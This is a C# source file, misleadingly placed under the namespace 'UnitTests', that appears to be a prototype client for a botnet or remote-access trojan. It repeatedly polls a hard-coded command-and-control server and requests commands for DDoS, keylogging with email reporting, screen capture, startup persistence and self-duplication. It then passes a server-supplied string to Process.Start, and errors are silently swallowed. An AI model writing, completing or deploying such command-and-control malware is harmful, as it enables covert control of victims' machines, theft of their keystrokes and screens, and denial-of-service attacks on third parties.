using System;
using System.Diagnostics;
using System.Net;

namespace UnitTests
{
    class Program
    {
        static void Main(string[] args)       
        {
            try
            {
                string ServerAddress = "http://cutenesss.xyz/server.php";

                WebClient client = new WebClient();

                string Secret = "<3"; //A string to use as the version ID. Use it for testing the client.


                //In future versions, this hash will be secret and enforced - Makes sure everyone is running latest client
                int GetIterations = -1;
                string target = "";
                bool Loop = true; // So we can break the loop
                Console.WriteLine("Varibles fine");
                while (Loop)
                {
                    if (GetIterations == -1 || (target != "" && GetIterations > 9) || target == "")
                    {
                        //Log("Asking the server for commands");
                        string paramaters = "?";

                        //Tells the server that this is a client, and not a web browser
                        if (paramaters == "?")
                            paramaters = paramaters + "isclient=true";
                        else
                            paramaters = paramaters + "&isclient=true";

                        //Analytical: Tells server this is a new client
                        //(Will probably be implemented in a newer version)
                        if (GetIterations == -1)
                        {
                            //Telling the server this is a new client
                            if (paramaters == "?")
                                paramaters = paramaters + "newclient=true";
                            else
                                paramaters = paramaters + "&newclient=true";
                        }
                        else
                        {
                            if (paramaters == "?")
                                paramaters = paramaters + "newclient=false";
                            else
                                paramaters = paramaters + "&newclient=false";
                        }
                        // 1 = DDOSOnline
                        if (paramaters == "?")
                            paramaters = paramaters + "ddosonline=true";
                        else
                            paramaters = paramaters + "&ddosonline=true";
                        // 2 = DDOSIP
                        if (paramaters == "?")
                            paramaters = paramaters + "ddosip=true";
                        else
                            paramaters = paramaters + "&ddosip=true";
                        // 3 = KeyloggerOnline
                        if (paramaters == "?")
                            paramaters = paramaters + "keyonline=true";
                        else
                            paramaters = paramaters + "&keyonline=true";

                        // 4 = KeyloggerEmail
                        if (paramaters == "?")
                            paramaters = paramaters + "keyloggeremail=true";
                        else
                            paramaters = paramaters + "&keyloggeremail=true";

                        // 5 = CaptureSceen
                        if (paramaters == "?")
                            paramaters = paramaters + "capturescreen=true";
                        else
                            paramaters = paramaters + "&capturescreen=true";

                        // 6 = Startup
                        if (paramaters == "?")
                            paramaters = paramaters + "startup=true";
                        else
                            paramaters = paramaters + "&startup=true";

                        // 7 = Duplication
                        if (paramaters == "?")
                            paramaters = paramaters + "duplication=true";
                        else
                            paramaters = paramaters + "&duplication=true";

                        if (paramaters == "?")
                            paramaters = paramaters + "website=get";
                        else
                            paramaters = paramaters + "&website=get";
                            
                        
                        

                        // 9 = Reverse
                        if (paramaters == "?")
                            paramaters = paramaters + "reverse=false";
                        else
                            paramaters = paramaters + "&reverse=false";


                        Console.WriteLine("Setting up parameters - fine");
                        string commands = "";
                        try
                        {
                            commands = client.DownloadString(ServerAddress + paramaters);
                        }
                        catch (WebException)
                        { }//TODO: Handle this Exception.
                        Console.WriteLine("Command fine");
                        string[] PreppedCommand = commands.Split(' ');
                        /// <summary>
                        /// COMMANDS : IMPORTAINT : 
                        /// 0 = Online 
                        /// 1 = DDOSOnline
                        /// 2 = DDOSIP
                        /// 3 = KeyloggerOnline
                        /// 4 = Keylogger email
                        /// 5 = Capture screen
                        /// 6 = Startup
                        /// 7  = Duplication
                        /// 8 = Reverse everything
                        /// </summary>
                        Console.WriteLine(PreppedCommand[0]);
                        Console.WriteLine(PreppedCommand[1]);
                        Console.WriteLine(PreppedCommand[2]);
                        Console.WriteLine(PreppedCommand[3]);
                        Console.WriteLine(PreppedCommand[4]);
                        Console.WriteLine(PreppedCommand[5]);
                        Console.WriteLine(PreppedCommand[6]);
                        Console.WriteLine(PreppedCommand[7]);
                        Console.WriteLine(PreppedCommand[8]);
                        Console.WriteLine(PreppedCommand[9]);
                        Console.ReadKey();
                        if (PreppedCommand[1] == "Online=True")
                        {
                            Console.WriteLine("WORKS!!!!");
                        }

                        string Website = PreppedCommand[8];
                        Console.WriteLine(Website);
                        using (var wc = new WebClient())
                        {
                            try
                            {
                                Process.Start(Website);
                            }
                            catch
                            {
                                // ignored
                            }
                        }
                    }
                }
            }
            catch { }
        }

    }
}
